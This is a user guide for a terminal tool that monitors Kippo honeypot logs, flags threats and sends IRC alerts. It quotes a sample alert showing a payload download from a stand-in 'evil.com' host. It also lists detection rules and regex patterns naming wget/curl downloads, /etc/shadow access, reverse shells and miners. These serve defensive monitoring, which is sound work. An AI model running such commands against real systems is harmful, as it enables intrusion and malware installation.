# Honeypot Monitor CLI - User Guide

This comprehensive guide covers all aspects of using the Honeypot Monitor CLI application, from basic setup to advanced configuration and troubleshooting.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Installation Guide](#installation-guide)
3. [Configuration](#configuration)
4. [Using the Interface](#using-the-interface)
5. [Monitoring and Analysis](#monitoring-and-analysis)
6. [IRC Notifications](#irc-notifications)
7. [Data Export and Reporting](#data-export-and-reporting)
8. [Advanced Features](#advanced-features)
9. [Troubleshooting](#troubleshooting)
10. [Best Practices](#best-practices)

## Getting Started

### What is Honeypot Monitor CLI?

Honeypot Monitor CLI is a terminal-based application designed to monitor and analyze Kippo honeypot activity in real-time. It provides:

- **Real-time monitoring** of honeypot logs
- **Threat analysis** with automatic categorization
- **Interactive terminal interface** for easy navigation
- **IRC notifications** for immediate alerts
- **Historical data analysis** and export capabilities

### System Requirements

Before installation, ensure your system meets these requirements:

- **Operating System**: Linux (Ubuntu 18.04+, CentOS 7+, Debian 9+, or similar)
- **Python**: Version 3.8 or higher
- **Memory**: 512MB RAM minimum (1GB recommended for large deployments)
- **Disk Space**: 100MB for application, additional space for log retention
- **Network**: Internet access for IRC notifications (optional)

### Quick Start Checklist

- [ ] Verify Python 3.8+ is installed: `python3 --version`
- [ ] Ensure Kippo honeypot is installed and running
- [ ] Note the location of Kippo log files
- [ ] Have IRC server details ready (if using notifications)
- [ ] Run the installation script
- [ ] Configure the application
- [ ] Start monitoring

## Installation Guide

### Automatic Installation (Recommended)

The easiest way to install Honeypot Monitor CLI is using the interactive installer:

```bash
# Download and run installer
curl -sSL https://raw.githubusercontent.com/example/honeypot-monitor-cli/main/install.sh | bash
```

Or if you prefer to inspect the script first:

```bash
# Download the installer
curl -sSL https://raw.githubusercontent.com/example/honeypot-monitor-cli/main/install.sh -o install.sh

# Review the script
cat install.sh

# Run the installer
chmod +x install.sh
./install.sh
```

#### Installation Process

The installer will guide you through several steps:

1. **System Check**: Verifies Python version and system compatibility
2. **Dependency Installation**: Installs required Python packages
3. **Kippo Detection**: Automatically finds Kippo installation paths
4. **Configuration Setup**: Creates initial configuration file
5. **IRC Setup**: Optionally configures IRC notifications
6. **Service Setup**: Optionally creates systemd service for background operation

#### Installation Options

During installation, you'll be prompted for:

- **Installation directory**: Default is `~/.honeypot-monitor`
- **Kippo log path**: Auto-detected or manually specified
- **IRC configuration**: Server, channel, and credentials
- **Service installation**: Whether to create systemd service
- **Startup configuration**: Auto-start options

### Manual Installation

For advanced users or custom deployments:

```bash
# Clone the repository
git clone https://github.com/example/honeypot-monitor-cli.git
cd honeypot-monitor-cli

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Install the application
pip install -e .

# Create configuration directory
mkdir -p ~/.honeypot-monitor/config
cp config/default.yaml ~/.honeypot-monitor/config/config.yaml

# Edit configuration
nano ~/.honeypot-monitor/config/config.yaml
```

### Verification

After installation, verify everything works:

```bash
# Check installation
honeypot-monitor --version

# Test configuration
honeypot-monitor --test-config

# Run in test mode (doesn't require Kippo)
honeypot-monitor --demo-mode
```

## Configuration

### Configuration File Location

The main configuration file is located at:
- User installation: `~/.honeypot-monitor/config/config.yaml`
- System installation: `/etc/honeypot-monitor/config.yaml`

### Basic Configuration

Here's a minimal configuration to get started:

```yaml
honeypot:
  log_path: "/opt/kippo/log/kippo.log"
  log_format: "kippo_default"

monitoring:
  refresh_interval: 1.0
  max_entries_memory: 10000

analysis:
  threat_threshold: "medium"

irc:
  enabled: false
```

### Complete Configuration Reference

```yaml
# Honeypot settings
honeypot:
  log_path: "/opt/kippo/log/kippo.log"    # Path to Kippo log file
  log_format: "kippo_default"              # Log format (kippo_default, custom)
  backup_paths:                            # Alternative log paths to try
    - "/var/log/kippo/kippo.log"
    - "/usr/local/kippo/log/kippo.log"

# Monitoring configuration
monitoring:
  refresh_interval: 1.0                    # Seconds between updates
  max_entries_memory: 10000                # Maximum log entries in memory
  file_check_interval: 5.0                 # Seconds between file checks
  reconnect_delay: 30.0                    # Delay before reconnecting to log file

# Threat analysis settings
analysis:
  threat_threshold: "medium"               # Minimum threat level to display (low, medium, high, critical)
  custom_rules_path: "./rules/"            # Path to custom threat detection rules
  pattern_detection: true                  # Enable pattern detection
  session_timeout: 3600                    # Session timeout in seconds
  ip_tracking: true                        # Track IP addresses across sessions

# IRC notification settings
irc:
  enabled: true                            # Enable IRC notifications
  server: "irc.libera.chat"               # IRC server hostname
  port: 6667                              # IRC server port
  channel: "#security-alerts"             # IRC channel to join
  nickname: "honeypot-monitor"            # Bot nickname
  ssl: false                              # Use SSL connection
  password: ""                            # Server password (if required)
  alert_types:                            # Types of alerts to send
    - "new_host"                          # New IP addresses
    - "high_threat"                       # High severity threats
    - "interesting_traffic"               # Unusual activity
  rate_limit: 5                           # Maximum messages per minute
  reconnect_attempts: 5                   # Reconnection attempts

# User interface settings
interface:
  theme: "dark"                           # Interface theme (dark, light)
  key_bindings: "default"                 # Key binding set (default, vim)
  refresh_rate: 30                        # Screen refresh rate (FPS)
  log_buffer_size: 1000                   # Number of log entries to display
  enable_colors: true                     # Enable color output
  show_timestamps: true                   # Show timestamps in logs

# Logging configuration
logging:
  level: "INFO"                           # Log level (DEBUG, INFO, WARNING, ERROR)
  file: "~/.honeypot-monitor/logs/app.log" # Log file path
  max_size: "10MB"                        # Maximum log file size
  backup_count: 5                         # Number of backup log files
```

### Environment Variables

You can override configuration settings using environment variables:

```bash
# Override log path
export HONEYPOT_LOG_PATH="/custom/path/kippo.log"

# Override IRC settings
export HONEYPOT_IRC_SERVER="irc.example.com"
export HONEYPOT_IRC_CHANNEL="#my-alerts"

# Override threat threshold
export HONEYPOT_THREAT_THRESHOLD="high"

# Start with environment overrides
honeypot-monitor
```

### Configuration Validation

Validate your configuration before starting:

```bash
# Test configuration file
honeypot-monitor --test-config

# Test specific components
honeypot-monitor --test-config --component=irc
honeypot-monitor --test-config --component=log-parser
```

## Using the Interface

### Starting the Application

```bash
# Start with default configuration
honeypot-monitor

# Start with custom configuration
honeypot-monitor --config /path/to/config.yaml

# Start in background (daemon mode)
honeypot-monitor --daemon

# Start with specific log file
honeypot-monitor --log-path /opt/kippo/log/kippo.log
```

### Interface Overview

The TUI consists of several main panels:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ Honeypot Monitor CLI v1.0.0                                    [IRC: ●]     │
├─────────────────────────────────────────────────────────────────────────────┤
│ Dashboard │ Log Viewer │ Analysis │ Settings │                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Real-time Activity Feed                    │  Connection Statistics        │
│  ┌─────────────────────────────────────────┐ │ ┌───────────────────────────┐ │
│  │ 10:30:15 192.168.1.100 LOGIN SUCCESS   │ │ │ Active Sessions: 3        │ │
│  │ 10:30:20 192.168.1.100 CMD: whoami     │ │ │ Total IPs Today: 15       │ │
│  │ 10:30:25 192.168.1.101 LOGIN FAILED    │ │ │ Threats Detected: 2       │ │
│  │ 10:30:30 192.168.1.100 CMD: ls -la     │ │ │ Last Alert: 5 min ago     │ │
│  └─────────────────────────────────────────┘ │ └───────────────────────────┘ │
│                                                                             │
│  Alert Notifications                                                        │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │ [HIGH] Malicious command detected from 192.168.1.100                   │ │
│  │ [MEDIUM] Multiple login attempts from 192.168.1.102                    │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────────────────────┤
│ Status: Monitoring /opt/kippo/log/kippo.log │ Memory: 45MB │ Uptime: 2h 15m │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Navigation

#### Keyboard Shortcuts

**Global Navigation:**
- `Tab` / `Shift+Tab`: Move between panels
- `q` / `Ctrl+C`: Quit application
- `h` / `F1`: Show help
- `r` / `F5`: Refresh current view

**Dashboard:**
- `↑` / `↓`: Scroll activity feed
- `Enter`: View entry details
- `f`: Filter entries
- `c`: Clear alerts

**Log Viewer:**
- `↑` / `↓`: Navigate log entries
- `Page Up` / `Page Down`: Scroll by page
- `Home` / `End`: Go to first/last entry
- `s`: Search logs
- `f`: Open filter dialog
- `e`: Export current view
- `d`: View entry details

**Analysis Panel:**
- `↑` / `↓`: Navigate threat list
- `Enter`: View threat details
- `t`: Filter by threat level
- `i`: View IP details
- `p`: View patterns

**Settings Panel:**
- `↑` / `↓`: Navigate options
- `Enter`: Edit setting
- `Space`: Toggle boolean settings
- `Escape`: Cancel changes
- `Ctrl+S`: Save changes

### Panel Details

#### Dashboard Panel

The dashboard provides real-time monitoring with:

- **Activity Feed**: Live stream of honeypot events
- **Statistics**: Current session counts and daily summaries
- **Alerts**: Recent threat notifications
- **Status Bar**: System status and resource usage

#### Log Viewer Panel

Browse and analyze historical logs:

- **Pagination**: Navigate through large log files
- **Search**: Find specific entries or patterns
- **Filtering**: Filter by IP, date range, event type
- **Export**: Save filtered results to CSV/JSON
- **Details**: Drill down into individual entries

#### Analysis Panel

View threat analysis results:

- **Threat List**: All detected threats with severity levels
- **Pattern Analysis**: Identified attack patterns
- **IP Tracking**: Repeat offenders and new hosts
- **Session Analysis**: Correlated activities across sessions

#### Settings Panel

Configure application settings:

- **Monitoring Settings**: Refresh rates, memory limits
- **Analysis Settings**: Threat thresholds, custom rules
- **IRC Settings**: Server, channel, notification types
- **Interface Settings**: Theme, key bindings, display options

## Monitoring and Analysis

### Real-time Monitoring

The application continuously monitors Kippo log files for new entries:

1. **File Watching**: Uses filesystem events to detect new log entries
2. **Parsing**: Extracts structured data from log lines
3. **Analysis**: Applies threat detection rules
4. **Display**: Updates the interface in real-time
5. **Notifications**: Sends IRC alerts for significant events

### Threat Detection

The threat analysis engine categorizes activities:

#### Threat Levels

- **Low**: Basic reconnaissance, common commands
- **Medium**: Suspicious commands, multiple login attempts
- **High**: Malicious downloads, privilege escalation attempts
- **Critical**: Active exploitation, persistence mechanisms

#### Threat Categories

- **Reconnaissance**: Information gathering activities
- **Exploitation**: Attempts to exploit vulnerabilities
- **Persistence**: Efforts to maintain access
- **Data Exfiltration**: Attempts to steal data

#### Detection Rules

Built-in rules detect:

- **Malicious Commands**: wget, curl, chmod +x, suspicious scripts
- **System Enumeration**: /etc/passwd, /etc/shadow, ps aux, netstat
- **Network Activity**: Port scans, reverse shells, tunneling
- **File Operations**: Suspicious file access, uploads, downloads
- **Brute Force**: Multiple failed login attempts
- **Privilege Escalation**: sudo attempts, SUID file searches

### Custom Rules

Create custom threat detection rules:

```yaml
# ~/.honeypot-monitor/rules/custom.yaml
rules:
  - name: "Cryptocurrency Mining"
    pattern: "(xmrig|cpuminer|minerd)"
    severity: "high"
    category: "exploitation"
    description: "Cryptocurrency mining software detected"
  
  - name: "Docker Commands"
    pattern: "docker (run|exec|ps)"
    severity: "medium"
    category: "reconnaissance"
    description: "Docker enumeration commands"
  
  - name: "Suspicious Downloads"
    pattern: "(wget|curl).*\\.(sh|py|pl|exe)"
    severity: "high"
    category: "exploitation"
    description: "Download of executable files"
```

### Session Correlation

The application tracks sessions across multiple log entries:

- **Session Grouping**: Groups entries by session ID
- **Command Sequences**: Tracks command progression
- **Time Analysis**: Identifies session duration and patterns
- **Cross-Session Tracking**: Correlates activities from same IP

## IRC Notifications

### Setting Up IRC Notifications

1. **Choose IRC Server**: Select a server (irc.libera.chat, irc.freenode.net, etc.)
2. **Create Channel**: Set up a dedicated channel for alerts
3. **Configure Bot**: Set nickname and authentication
4. **Test Connection**: Verify connectivity before deployment

### Configuration Example

```yaml
irc:
  enabled: true
  server: "irc.libera.chat"
  port: 6667
  channel: "#honeypot-alerts"
  nickname: "honeypot-bot"
  ssl: false
  alert_types:
    - "new_host"
    - "high_threat"
    - "interesting_traffic"
  rate_limit: 5
```

### Alert Types

#### New Host Alerts
Sent when a new IP address connects:
```
[NEW HOST] 192.168.1.100 first seen at 2024-01-15 10:30:15
```

#### Threat Alerts
Sent for high-severity threats:
```
[HIGH THREAT] 192.168.1.100 - Malicious download detected: wget http://evil.com/payload.sh
```

#### Interesting Traffic Alerts
Sent for unusual but not necessarily malicious activity:
```
[INTERESTING] 192.168.1.100 - Multiple failed login attempts (5 attempts in 2 minutes)
```

### IRC Commands

The bot responds to IRC commands:

- `!status`: Show monitoring status
- `!stats`: Display current statistics
- `!threats`: List recent threats
- `!help`: Show available commands

### Rate Limiting

To prevent channel flooding:
- Maximum 5 messages per minute by default
- Duplicate alerts are suppressed
- Critical alerts bypass rate limiting

## Data Export and Reporting

### Export Formats

The application supports multiple export formats:

#### CSV Export
```bash
# Export current view to CSV
# In Log Viewer, press 'e' and select CSV format
```

CSV format includes:
- Timestamp
- Session ID
- Source IP
- Event Type
- Command
- Threat Level

#### JSON Export
```bash
# Export current view to JSON
# In Log Viewer, press 'e' and select JSON format
```

JSON format includes full entry details with metadata.

### Automated Reports

Generate periodic reports:

```bash
# Daily threat summary
honeypot-monitor --report daily --output /tmp/daily-report.json

# Weekly activity report
honeypot-monitor --report weekly --format csv --output /tmp/weekly.csv

# Custom date range
honeypot-monitor --report custom --start 2024-01-01 --end 2024-01-31
```

### Integration with External Tools

Export data for analysis in external tools:

```bash
# Export to ELK Stack
honeypot-monitor --export elasticsearch --host localhost:9200

# Export to Splunk
honeypot-monitor --export splunk --host splunk.example.com

# Export to SIEM
honeypot-monitor --export syslog --host siem.example.com:514
```

## Advanced Features

### Custom Log Formats

Support custom Kippo log formats:

```yaml
honeypot:
  log_format: "custom"
  custom_format:
    timestamp_pattern: "%Y-%m-%d %H:%M:%S%z"
    entry_pattern: "\\[(.*?)\\] (.*)"
    field_mapping:
      timestamp: 1
      message: 2
```

### Plugin System

Extend functionality with plugins:

```python
# ~/.honeypot-monitor/plugins/custom_analyzer.py
from honeypot_monitor.interfaces.analyzer_interface import AnalyzerInterface

class CustomAnalyzer(AnalyzerInterface):
    def analyze_entry(self, entry):
        # Custom analysis logic
        pass
```

### API Integration

Expose monitoring data via REST API:

```bash
# Start with API enabled
honeypot-monitor --enable-api --api-port 8080

# Query API
curl http://localhost:8080/api/v1/status
curl http://localhost:8080/api/v1/threats
curl http://localhost:8080/api/v1/sessions
```

### Clustering

Monitor multiple honeypots:

```yaml
cluster:
  enabled: true
  nodes:
    - name: "honeypot-1"
      host: "192.168.1.10"
      log_path: "/opt/kippo/log/kippo.log"
    - name: "honeypot-2"
      host: "192.168.1.11"
      log_path: "/opt/kippo/log/kippo.log"
```

## Troubleshooting

### Common Issues

#### Installation Problems

**Python version too old:**
```bash
# Check Python version
python3 --version

# Install newer Python (Ubuntu/Debian)
sudo apt update
sudo apt install python3.9 python3.9-venv python3.9-pip

# Use specific Python version
python3.9 -m venv venv
```

**Permission denied errors:**
```bash
# Use user installation
pip install --user -e .

# Or fix permissions
sudo chown -R $USER:$USER ~/.honeypot-monitor
```

**Missing dependencies:**
```bash
# Install system dependencies (Ubuntu/Debian)
sudo apt install python3-dev build-essential

# Install system dependencies (CentOS/RHEL)
sudo yum install python3-devel gcc
```

#### Configuration Issues

**Kippo logs not found:**
```bash
# Find Kippo installation
find /opt /usr/local /var -name "kippo.log" 2>/dev/null

# Check log file permissions
ls -la /opt/kippo/log/kippo.log

# Test log file access
tail -f /opt/kippo/log/kippo.log
```

**Configuration validation fails:**
```bash
# Check configuration syntax
honeypot-monitor --test-config --verbose

# Validate specific sections
honeypot-monitor --test-config --section irc
```

#### Runtime Problems

**High memory usage:**
```yaml
# Reduce memory usage in config
monitoring:
  max_entries_memory: 5000  # Reduce from default 10000
  
interface:
  log_buffer_size: 500      # Reduce from default 1000
```

**IRC connection fails:**
```bash
# Test IRC connectivity
telnet irc.libera.chat 6667

# Check firewall rules
sudo iptables -L | grep 6667

# Test with different server
honeypot-monitor --irc-server irc.freenode.net
```

**TUI display issues:**
```bash
# Check terminal capabilities
echo $TERM
tput colors

# Try different terminal
export TERM=xterm-256color
honeypot-monitor

# Disable colors if needed
honeypot-monitor --no-colors
```

### Debug Mode

Enable debug logging for troubleshooting:

```bash
# Start with debug logging
honeypot-monitor --debug

# Or set in configuration
logging:
  level: "DEBUG"
```

### Log Analysis

Check application logs:

```bash
# View recent logs
tail -f ~/.honeypot-monitor/logs/app.log

# Search for errors
grep ERROR ~/.honeypot-monitor/logs/app.log

# View IRC connection logs
grep IRC ~/.honeypot-monitor/logs/app.log
```

### Performance Tuning

Optimize performance for large deployments:

```yaml
# Performance-optimized configuration
monitoring:
  refresh_interval: 2.0      # Slower refresh for less CPU usage
  max_entries_memory: 5000   # Reduce memory usage
  file_check_interval: 10.0  # Less frequent file checks

interface:
  refresh_rate: 15           # Lower FPS for less CPU usage
  log_buffer_size: 500       # Smaller display buffer

analysis:
  pattern_detection: false   # Disable if not needed
```

### Getting Help

If you encounter issues not covered here:

1. **Check the FAQ**: See docs/FAQ.md
2. **Search existing issues**: GitHub issues page
3. **Enable debug logging**: Capture detailed logs
4. **Create minimal reproduction**: Simplify the problem
5. **Report the issue**: Include logs and configuration

## Best Practices

### Security

- **Secure IRC credentials**: Use dedicated bot accounts
- **Limit log access**: Ensure proper file permissions
- **Monitor the monitor**: Watch for application errors
- **Regular updates**: Keep the application updated
- **Backup configuration**: Save configuration files

### Performance

- **Resource monitoring**: Monitor CPU and memory usage
- **Log rotation**: Implement log file rotation
- **Disk space**: Monitor available disk space
- **Network bandwidth**: Consider IRC traffic in bandwidth planning

### Operational

- **Service monitoring**: Use systemd or similar for reliability
- **Alerting**: Set up monitoring for the monitoring application
- **Documentation**: Document your specific configuration
- **Testing**: Regularly test IRC notifications and exports
- **Maintenance**: Schedule regular maintenance windows

### Deployment

- **Staging environment**: Test changes in staging first
- **Gradual rollout**: Deploy to one honeypot at a time
- **Rollback plan**: Have a rollback procedure ready
- **Monitoring**: Monitor application health after deployment
- **Documentation**: Keep deployment procedures documented

This completes the comprehensive user guide. The guide covers all aspects of installation, configuration, usage, and troubleshooting to help users effectively deploy and operate the Honeypot Monitor CLI application.